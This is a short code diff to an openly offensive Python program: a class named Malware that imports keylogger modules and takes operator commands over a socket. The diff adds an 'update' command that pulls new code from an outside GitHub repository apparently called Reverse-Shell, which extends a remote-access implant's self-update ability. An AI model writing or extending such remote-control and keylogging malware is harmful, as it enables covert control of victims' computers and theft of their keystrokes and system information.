@@ -7,6 +7,7 @@ import stat
 import sys
 from keylogging import *
 from keylogging import keylogger
+from subprocess import call
 # from colorama import Fore, Style
 
 
@@ -227,6 +228,9 @@ class Malware:
 
                 elif get_cmd == 'sysinfo':
                     self.sock.send(self.get_system_information())
+
+                elif get_cmd == 'update':
+                    call(['git','pull','https://github.com/H-ckingTools/Reverse-Shell.git'])
 
                 elif get_cmd.startswith('which'):
                     get_exec = get_cmd.split()[1]
